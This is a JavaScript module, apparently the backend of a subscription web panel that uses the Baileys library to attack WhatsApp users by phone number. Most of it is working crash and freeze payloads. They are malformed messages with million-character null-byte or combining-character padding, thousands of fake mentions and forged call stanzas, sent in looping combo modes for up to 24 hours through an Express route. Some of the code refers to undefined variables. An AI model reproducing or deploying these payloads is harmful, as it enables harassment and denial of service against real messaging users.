const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const crypto = require('crypto');

// --- GLOBAL VARIABLES ---
let userApiBug = null;
let sock; // Global fallback
let lastExecution = 0;
const activeWebUsers = new Map();
const activeSessions = new Map();
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const delay = sleep; // Alias

// --- HTML RENDERER ---
const executionPage = (status = "🟥 Ready", detail = {}, isForm = true, userInfo = {}, userKey = "", message = "", mode = "") => {
    const { username, expired, role } = userInfo;
    
    const formattedTime = expired ? new Date(expired).toLocaleString("id-ID", { 
        timeZone: "Asia/Jakarta", 
        year: "2-digit", month: "2-digit", day: "2-digit", 
        hour: "2-digit", minute: "2-digit" 
    }) : "-";

    const rawRole = (role || 'user').toLowerCase();
    let roleHtml = "";

    switch (rawRole) {
        case "owner": case "creator": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
        case "admin": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
        case "reseller": case "ress": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;"> Reseller</span>'; break;
        case "pt": roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
        case "vip": roleHtml = '<span style="color: #FFFFFF;">VIP</span>'; break;
        case "moderator": roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
        default: roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
    }

    const filePath = path.join(__dirname, "KeiraaIndex", "SparkGo.html");

    try {
        let html = fs.readFileSync(filePath, "utf8");
        return html
            .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
            .replace(/\$\{userKey\}/g, userKey || "")
            .replace(/\$\{password\}/g, userKey || "")
            .replace(/\{\{password\}\}/g, userKey || "")
            .replace(/\{\{key\}\}/g, userKey || "")
            .replace(/\$\{key\}/g, userKey || "")
            .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
            .replace(/\$\{username\}/g, username || "Unknown")
            .replace(/\{\{username\}\}/g, username || "Unknown")
            .replace(/\{\{expired\}\}/g, formattedTime)
            .replace(/\$\{formattedTime\}/g, formattedTime)
            .replace(/\{\{status\}\}/g, status)
            .replace(/\{\{message\}\}/g, message)
            .replace(/\$\{displayRole\}/g, roleHtml)
            .replace(/\$\{rawRole\}/g, rawRole)
            .replace(/\$\{activeConnections\}/g, activeSessions);
    } catch (err) {
        console.error(err);
        return `<h1>Error Loading HTML</h1>`;
    }
};

// --- BUG FUNCTIONS (ALL ACCEPT 'sock') --
async function makluxnxx(sock, target, isVideo = true) {
const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");

  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`)

    await sock.assertSessions(devices)

    const createMutex = () => {
      const locks = new Map()
      return {
        async mutex(key, fn) {
          while (locks.has(key)) await locks.get(key)
          const lock = Promise.resolve().then(fn)
          locks.set(key, lock)
          try {
            return await lock
          } finally {
            locks.delete(key)
          }
        }
      }
    }

    const mutexManager = createMutex()

    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8)
      buffer.copy(newBuffer)
      newBuffer.fill(1, buffer.length)
      return newBuffer
    }

    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock)

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return { nodes: [], shouldIncludeDeviceIdentity: false }
      }

      const processedMessage =
        await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message)

      const messagePairs = Array.isArray(processedMessage)
        ? processedMessage
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }))

      const { id: meId, lid: meLid } = sock.authState.creds.me
      const localUser = meLid ? jidDecode(meLid)?.user : null
      let shouldIncludeDeviceIdentity = false

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid)
          const { user: ownUser } = jidDecode(meId)
          const isOwnUser = targetUser === ownUser || targetUser === localUser
          const isSelf = jid === meId || jid === meLid

          if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage
              ? originalEncodeWAMessage(msg)
              : encodeWAMessage(msg)
          )

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } =
              await sock.signalRepository.encryptMessage({
                jid,
                data: encodedBytes
              })

            if (type === "pkmsg") shouldIncludeDeviceIdentity = true

            return {
              tag: "to",
              attrs: { jid },
              content: [{
                tag: "enc",
                attrs: { v: "2", type, ...extraAttrs },
                content: ciphertext
              }]
            }
          })
        })
      )

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity }
    }

    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase()

    const { nodes: destinations, shouldIncludeDeviceIdentity } =
      await sock.createParticipantNodes(
        devices,
        { conversation: "call-initiated" },
        { count: "0" }
      )

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          ...(isVideo ? [{
            tag: "video",
            attrs: {
              enc: "vp8",
              dec: "vp8",
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0"
            }
          }] : []),
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(
              sock.authState.creds.account,
              true
            )
          }] : [])
        ]
      }]
    }

    await Promise.all([
      sock.sendNode(callStanza),
      sock.relayMessage(
        target,
        { sendPaymentMessage: {} },
        {}
      )
    ])

  } catch (err) {
    console.error("callCrash error:", err)
    throw err
  }
}

async function R9X(reyz, target) {
  var R9X = {
    sendPaymentMessage: {
    }
  };
  await reyz.relayMessage(target, R9X, {
  });
}

async function DelayMakluw(Wizzx, X, mention = true) {  
 let msg = await generateWAMessageFromContent(X,  {  
  viewOnceMessage: { 
    message: {  
       interactiveResponseMessage: {  
         body: {  
          text: "Wizzx Is Here?",  
          format: "MakLuw"  
         },  
       nativeFlowResponseMessage: {  
            name: "call_permission_request",  
             paramsJson: "\u0000".repeat(1000000),  
           version: 3  
           },
           contextInfo: {
            mentionedJid: [
               "13135550002@s.whatsapp.net",
               X,
               ...Array.from({ length: 2000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
               )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "",
                caption: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          },
        }  
      }  
    }  
  },  
    {  
     userJid: X,  
     quoted: null  
   }  
 );  

  await Wizzx.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
          statusJidList: [X],
            additionalNodes: [
             {
               tag: "meta",
                attrs: {},
                 content: [
                  {
                   tag: "mentioned_users",
                    attrs: {},
                      content: [
                      {
                      tag: "to",
                       attrs: { jid: X }, 
                        content: undefined
                       }
                     ]
                  }
                ]
             }
          ]
      });
      await new Promise(resolve => setTimeout(resolve, 5000));
 
     if (mention) {
        await Wizzx.relayMessage(X, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {});
    }

    console.log(chalk.green(`Delay New for ${X}`));
}

async function crashui(target) {
  await Yuukey.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "D | 7eppeli-Killer-Queen" + "ꦽ".repeat(7000),
          contentText: "D | 7eppeli-KillerQueen" + "ꦽ".repeat(7000),
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/YuukeyD7eppeli",
                    unconsentedUsersUrl: "https://t.me/YuukeyD7eppeli",
                    consentedUsersUrl: "https://t.me/YuukeyD7eppeli",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/BrandoBrandoBran",
                    unconsentedUsersUrl: "https://t.me/BrandoBrandoBran",
                    consentedUsersUrl: "https://t.me/BrandoBrandoBran",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "~>",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {
    participant: { jid:target }
  });
}

async function SvlzvsInvis(depayy, target) {
var xts = { url: "https://l.top4top.io/p_3552yqrjh1.jpg" }
const imagePayload = {
  viewOnceMessage: {
    message: {
      interactiveResponseMessage: {
        body: {
          text: " 𐌕𐌆𐌄 ★ 𐌓𐌉𐌕𐌂𐌆𐌉𐌄🧬 ", 
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1000000),
          version: 3,
        },
      },
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 2000 },
            () =>
            "1" +
            Math.floor(Math.random() * 9000000) +
            "@s.whatsapp.net"
          ),
        ],
        forwardingScore: 555,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: false,
          title: "! 𐌕𐌆𐌄 ★ 𐌓𐌉𐌕𐌂𐌆𐌉𐌄 - \"𝗋34\" 🩸",
          body: "https://rule34.com",
          previewType: "VIDEO",
          mediaType: "VIDEO",
          thumbnail: xts,
          sourceUrl: "t.me/TheDitChie",
          mediaUrl: "t.me/TheDitChie",
          sourceType: " x ",
          sourceId: " x ",
          containsAutoReply: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example",
        },
        quotedAd: {
          advertiserName: " X ",
          mediaType: "IMAGE",
          jpegThumbnail: xts,
          caption: " X ",
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890",
        },
        isSampled: false,
        utm: {
          utmSource: " X ",
          utmCampaign: " X ",
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "6287888888888-1234567890@g.us",
          serverMessageId: 1,
          newsletterName: " X ",
          contentType: "UPDATE",
          accessibilityText: " X ",
        },
      },
    },
  },
 };
 
 const msg = await generateWAMessageFromContent(target, imagePayload, {});  
 await depayy.relayMessage("status@broadcast", msg.message, {
   messageId: msg.key.id,
   statusJidList: [target]
 });
}

async function PayIphone(depayy, target) {
    await depayy.relayMessage(
        target, {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Math.floor(Math.random() * -20000000),
            },
        }, {
            participant: {
                jid: target,
            },
        }
    );
}

async function CrashIp(depayy, target) {
    try {
        await depayy.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://Wa.me/stickerpack/Depay`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function CrashIpV2(depayy, target) {
    try {
        await depayy.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: "https://" + "𑇂𑆵𑆴𑆿".repeat(1817) + ".com"
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function LocationUi(depayy, target) {
  try {
    await depayy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝗦𝗛𝗛𝗛𝗛𝗛𝗛𝗛𝗛" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
  
  async function FreezeXDelay1(depayy, target) {
  try {
    await depayy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "Pepek Crasher?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "depayy - Crasher",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FreezeXDelay2(depayy, target) {
  try {
    await depayy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝗦𝗛𝗛𝗛𝗛𝗛 𝗜𝗡𝗙𝗢" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function GetSuZoBlank(X, XJID) {
const msg = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
          name: `𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃ #🇧🇷 ( 𝟕𝟕𝟕 )` + "ោ៝".repeat(30000),
          publisher: `𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃ #🇧🇷 ( 𝟕𝟕𝟕 )` + "ោ៝".repeat(30000),
          caption: "𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃ #🇧🇷 ( 𝟕𝟕𝟕 )",
          stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["🍁", "🗑️"],
              accessibilityLabel: "@wizznotfav",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🗑️", "🍁"],
              accessibilityLabel: "@wizznotfav_",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
          fileLength: "728050",
          fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
          fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
          mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
          directPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            dataSharingContext: {
              showMmDisclosure: true
            },
            quotedMessage: {
              callLogMesssage: {
              isVideo: false,
              callOutcome: "REJECTED",
              durationSecs: "1",
              callType: "VOICE_CHAT",
                participants: [
                  { jid: X, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃ #🇧🇷 ( 𝟕𝟕𝟕 )" + "ោ៝".repeat(10),
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              thumbnailUrl: imgLinks,
              mediaType: 1,
              WizzxderLargerThumbnail: true
            }
          },
          packDescription: "𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃ #🇧🇷 ( 𝟕𝟕𝟕 )" + "ោ៝".repeat(100000),
          jpegThumbnail: imgLinks,
          mediaKeyTimestamp: "1736088676",
          trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
          thumbnailDirectPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
          thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
          thumbnailHeight: 999999999,
          thumbnailWidth: 999999999,
          imageDataHash: "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
          stickerPackSize: "723949",
          stickerPackOrigin: "THIRD_PARTY"
        }
      }
    }
  }, { userJid: X });
  await Wizzx.relayMessage(
    X,
    msg.message,
    XJID
      ? { participant: { jid: X, messageId: msg.key.id } }
      : {}
  );
}

async function GetSuZoBlank2(X) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "⍣᳟༑ 𝐆͡𝐞͜𝐓𝐒̽𝐮͢𝐗𝐨 𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃༑⃟꙳〽️" + "ោ៝".repeat(10000),
      caption: "⍣᳟༑ 𝐆͡𝐞͜𝐓𝐒̽𝐮͢𝐗𝐨 𝐖𝐞̈𝐅𝐨𝐫𝐖𝐢̈𝐳𝐳̃༑⃟꙳〽️" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await Wizzx.relayMessage(X, msg, {
    participant: { jid: X },
    messageId: null
  });
}
async function ZhTFlowers(Wizzx, X) {
    while (true) {
        var ZhT = {
            ephemeralMessage: {
                viewOncemessage: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3000 }, (_, r) => `62859${r + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "Wizz - Flowers",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}}`,
                            version: 3
                        }
                    }
                }
            }
        };

        await Wizzx.relayMessage(X, ZhT, {
            messageId: null,
            participant: { jid: X },
            userJid: X,
        });
    }
}

// --- COMBO FUNCTIONS (UPDATED SIGNATURES) ---

async function DelayHard(sock, X) {
    for (let r = 0; r < 90; r++) {
        await DelayMakluw(Wizzx, X, mention = true);
        await crashui(target);
        await sleep(20000);
        await SvlzvsInvis(depayy, target);
        await sleep(100);
    }
}

async function CrashNotif(sock, target) {
    for (let r = 0; r < 100; r++) {
       await PayIphone(depayy, target)
       await sleep(20000);
       await CrashIp(depayy, target);
       await sleep(10000)
       await CrashIpV2(depayy, target);
       await sleep(500)
       await LocationUi(depayy, target);
       await sleep(200)
    }
}

async function IsagiComboFc1(sock, durationHours, target) {
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 0;
    const maxBatch = 2;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch >= maxBatch) {
            console.log(`🛑 Stopped IsagiCombo`);
            return;
        }
        try {
            if (count < 70) {
              await R9X(reyz, target);
              await R9X(reyz, target);
              await crashui(target);
              await GetSuZoBlank2(X);
              await GetSuZoBlank(X);
              await ZhTFlowers(Wizzx, X);
              await FreezeXDelay1(depayy, target);
             await FreezeXDelay2(depayy, target);
                console.log(chalk.hex('#00BFFF')(`[ Keiraa Executed ] SuccesFull Send !!`));
                count++;
                setTimeout(sendNext, 100);
            } else {
                count = 0;
                batch++;
                if (batch < maxBatch) setTimeout(sendNext, 100);
            }
        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            setTimeout(sendNext, 100);
        }
    };
    sendNext();
}

async function Crashandroid(sock, durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) return;

    try {
      if (count < 60) {
        await R9X(reyz, target);
              await R9X(reyz, target);
              await crashui(target);
              await GetSuZoBlank2(X);
              await GetSuZoBlank(X);
             await FreezeXDelay1(depayy, target);
             await FreezeXDelay2(depayy, target);
             await ZhTFlowers(Wizzx, X);
        console.log(chalk.red(`[ Keiraa Executed ] Succesfull Send !!`));
        count++;
        setTimeout(sendNext, 4000);
      } else {
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 60000);
        }
      }
    } catch (error) {
      console.error(`✗ Error: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function DelayBapakLo(sock, durationHours, X) {
  const sendNext = async () => {
      try {
          await DelayMakluw(Wizzx, X, mention = true);
          await DelayMakluw(Wizzx, X, mention = true);
          await SvlzvsInvis(depayy, target);
          await sleep(2000);
          console.log(chalk.red(`❄️ DelayBapakLo Hit`));
      } catch (e) { }
  }
  sendNext();
}

async function Forclose(sock, durationHours, X) {
    const sendNext = async () => {
        try {
            await makluxnxx(sock, X);
            await sleep(500);
            await R9X(reyz, target);
            await sleep(500);
            console.log(chalk.red(`Fc Hit`));
        } catch (e) { }
    };
    sendNext();
}

// --- MAIN MODULE EXPORT ---

module.exports = function(app, sessions, getUsers) {
    
    app.get("/execution", (req, res) => {
        
        // 1. Cek Login
        if (!req.cookies || !req.cookies.sessionUser) {
            return res.redirect('/login');
        }

        const username = req.cookies.sessionUser;
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);

        if (!currentUser) {
            return res.clearCookie("sessionUser").redirect('/login');
        }

        if (currentUser.expired && Date.now() > currentUser.expired) {
            return res.redirect('/login?msg=Expired');
        }

        // 2. Logika User Online
        const nowTime = Date.now();
        activeWebUsers.set(username, nowTime);
        for (const [user, time] of activeWebUsers) {
            if (nowTime - time > 300000) activeWebUsers.delete(user);
        }
        const totalOnlineUsers = activeWebUsers.size; 
        const activeCount = sessions ? sessions.size : 0;

        // 3. Request Bug
        const targetNumber = req.query.target;
        const mode = req.query.mode;

        if (targetNumber || mode) {
            // FIND VALID SOCKET
            let currentSock = null;
            if (sessions && sessions.size > 0) {
                const allSockets = [...sessions.values()];
                currentSock = allSockets.find(s => s && s.user);
            }

            if (!currentSock) {
                return res.send(executionPage("⚠️ NO SENDER", { message: "Bot belum terhubung!" }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));
            }

            // Set Global
            sock = currentSock;
            
            const now = Date.now();
            const cooldown = 3 * 60 * 1000;
            if ((now - lastExecution < cooldown)) {
                const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
                return res.send(executionPage("⏳ COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, "", activeCount, totalOnlineUsers));
            }

            const target = `${targetNumber}@s.whatsapp.net`;

            try {
                // EXECUTE BUG WITH SOCKET
                if (mode === "andros") Crashandroid(currentSock, 24, target);
                else if (mode === "delay") DelayBapakLo(currentSock, 24, target);
                else if (mode === "fc1") IsagiComboFc1(currentSock, 24, target);
                else if (mode === "fc2") Forclose(currentSock, 24, target); 
                else throw new Error("Mode tidak dikenal.");

                lastExecution = now;
                console.log(chalk.red(`System Sending Bug to ${targetNumber} | Mode: ${mode}`));

                return res.send(executionPage("✓ SUCCESS", {
                    target: targetNumber,
                    timestamp: new Date().toLocaleString("id-ID"),
                    message: `Executing ${mode.toUpperCase()}...`
                }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));

            } catch (err) {
                console.error(err);
                return res.send(executionPage("✗ Error", { target: targetNumber, message: "Server Error" }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));
            }
        }

        res.send(executionPage("🟥 Ready", {}, true, currentUser, currentUser.key, ""));
    });
    
        // --- RUTE BARU: PUBLIC CHAT PAGE ---
        // --- RUTE BARU: PUBLIC CHAT PAGE (FIX TOTAL USER) ---
    app.get("/tools/public-chat", (req, res) => {
        // 1. Cek Login
        if (!req.cookies || !req.cookies.sessionUser) return res.redirect('/login');
        
        const username = req.cookies.sessionUser;
        const users = getUsers(); // Ambil semua data user dari database
        const currentUser = users.find(u => u.username === username);
        
        if (!currentUser) return res.redirect('/login');

        // 2. Siapkan Data
        const role = currentUser.role || 'Member';
        const totalUserCount = users.length; // Hitung Total User Database
        
        // Hitung User Online (Dari Map activeWebUsers yang ada di atas)
        // Pastikan activeWebUsers sudah didefinisikan di global variable file ini
        const onlineUserCount = activeWebUsers ? activeWebUsers.size : 0; 
        
        // 3. Baca File HTML
        const chatFilePath = path.join(__dirname, "KeiraaIndex", "PublicChat.html");
        
        try {
            let html = fs.readFileSync(chatFilePath, "utf8");
            
            // 4. Inject Data ke HTML
            html = html
                .replace(/\$\{username\}/g, username)
                .replace(/\$\{role\}/g, role)
                .replace(/\$\{totalUsers\}/g, totalUserCount)   // <--- Inject Total
                .replace(/\$\{onlineUsers\}/g, onlineUserCount); // <--- Inject Online
                
            res.send(html);
        } catch (e) {
            console.error(e);
            res.send("<h1>404: PublicChat.html Not Found</h1>");
        }
    });
};